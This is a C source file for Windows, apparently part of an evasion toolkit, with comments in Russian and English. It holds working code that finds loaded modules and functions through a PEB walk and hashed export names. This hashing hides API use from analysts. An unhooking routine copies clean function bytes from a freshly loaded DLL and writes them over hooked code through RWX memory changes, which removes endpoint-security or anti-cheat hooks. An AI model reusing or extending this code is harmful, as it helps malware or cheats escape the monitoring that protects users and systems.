#include "utils.h"
#include <string.h>
#include <intrin.h>  // Для __readgsqword
#include <wctype.h>  // Для towlower

// Типы для Nt* функций
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

// Hash calc для ANSI
static DWORD calcHash(const char* data) {
    DWORD hash = 0x99;
    for (int i = 0; data[i]; i++) {
        hash += (DWORD)data[i] + (hash << 1);
    }
    return hash;
}

// Lower для ANSI
static char* myToLowerA(char* str) {
    for (char* p = str; *p; p++) {
        if (*p >= 'A' && *p <= 'Z') *p += 32;
    }
    return str;
}

// Hash для wide strings
static DWORD calcHashW(const wchar_t* data) {
    DWORD hash = 0x99;
    for (int i = 0; data[i]; i++) {
        hash += (DWORD)towlower(data[i]) + (hash << 1);
    }
    return hash;
}

// Lower для wide
static wchar_t* myToLowerW(wchar_t* str) {
    for (wchar_t* p = str; *p; p++) {
        *p = towlower(*p);
    }
    return str;
}

// Hash module (wide)
static DWORD calcHashModuleW(PLDR_MODULE mdll) {
    wchar_t name[256] = {0};
    size_t len = mdll->baseDllName.Length / sizeof(wchar_t);
    if (len >= 256) len = 255;
    wcsncpy(name, mdll->baseDllName.Buffer, len);
    name[len] = L'\0';  // Ensure null-termination
    myToLowerW(name);
    return calcHashW(name);
}

// PEB walk для GetModuleHandle
HMODULE GetModuleHandlePeb(LPCWSTR name) {
    wchar_t lowerName[256];
    wcscpy(lowerName, name);
    myToLowerW(lowerName);
    DWORD nameHash = calcHashW(lowerName);

    INT_PTR peb = __readgsqword(0x60);
    INT_PTR ldr = *(INT_PTR*)(peb + 0x18);
    INT_PTR flink = *(INT_PTR*)(ldr + 0x10);
    PLDR_MODULE mdl = (PLDR_MODULE)flink;
    do {
        mdl = (PLDR_MODULE)mdl->e[0].Flink;
        if (mdl->base && calcHashModuleW(mdl) == nameHash) {
            return (HMODULE)mdl->base;
        }
    } while (flink != (INT_PTR)mdl);
    return NULL;
}

// EAT parsing для GetProcAddress
PVOID GetProcAddressPeb(HMODULE hModule, LPCSTR name) {
    char lowerName[256];
    strcpy(lowerName, name);
    myToLowerA(lowerName);
    DWORD funcHash = calcHash(lowerName);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD names = (PDWORD)((PBYTE)hModule + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)((PBYTE)hModule + exp->AddressOfFunctions);
    PWORD ords = (PWORD)((PBYTE)hModule + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        LPCSTR funcName = (LPCSTR)((PBYTE)hModule + names[i]);
        char funcLower[256];
        strcpy(funcLower, funcName);
        myToLowerA(funcLower);
        if (calcHash(funcLower) == funcHash) {
            return (PVOID)((PBYTE)hModule + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Unhook без inline-ассемблера
NTSTATUS UnhookFunctionDirect(PVOID targetFunc, HMODULE module, const char* funcName) {
    // Get clean bytes
    HMODULE dupeMod = LoadLibraryExA("jvm.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!dupeMod) return STATUS_NOT_FOUND;
    PVOID cleanFunc = GetProcAddressPeb(dupeMod, funcName);
    if (!cleanFunc) {
        FreeLibrary(dupeMod);
        return STATUS_NOT_FOUND;
    }
    BYTE originalBytes[64];

    // --- ИЗМЕНЕНИЕ: Замена memcpy на побайтовый цикл ---
    // Старая строка:
    // memcpy(originalBytes, cleanFunc, sizeof(originalBytes));
    
    // Новый цикл для побайтового копирования.
    // Приводим cleanFunc к указателю на BYTE, чтобы читать память по одному байту.
    BYTE* sourceBytes = (BYTE*)cleanFunc;
    for (size_t i = 0; i < sizeof(originalBytes); ++i) {
        originalBytes[i] = sourceBytes[i];
    }
    // --- КОНЕЦ ИЗМЕНЕНИЯ ---

    FreeLibrary(dupeMod);

    // Загружаем ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return STATUS_NOT_FOUND;

    // Получаем Nt* функции
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    if (!NtProtectVirtualMemory || !NtWriteVirtualMemory) return STATUS_NOT_FOUND;

    NTSTATUS status;
    HANDLE process = (HANDLE)-1;
    PVOID baseAddr = targetFunc;
    SIZE_T regionSize = sizeof(originalBytes);
    ULONG oldProtect = 0;
    ULONG newProtect = PAGE_EXECUTE_READWRITE;

    // NtProtectVirtualMemory to RW
    status = NtProtectVirtualMemory(process, &baseAddr, &regionSize, newProtect, &oldProtect);
    if (!NT_SUCCESS(status)) return status;

    // NtWriteVirtualMemory
    status = NtWriteVirtualMemory(process, targetFunc, originalBytes, regionSize, NULL);
    if (!NT_SUCCESS(status)) return status;

    // Restore protection
    status = NtProtectVirtualMemory(process, &baseAddr, &regionSize, oldProtect, &oldProtect);
    if (!NT_SUCCESS(status)) return status;

    FlushInstructionCache(process, targetFunc, regionSize);
    return STATUS_SUCCESS;
}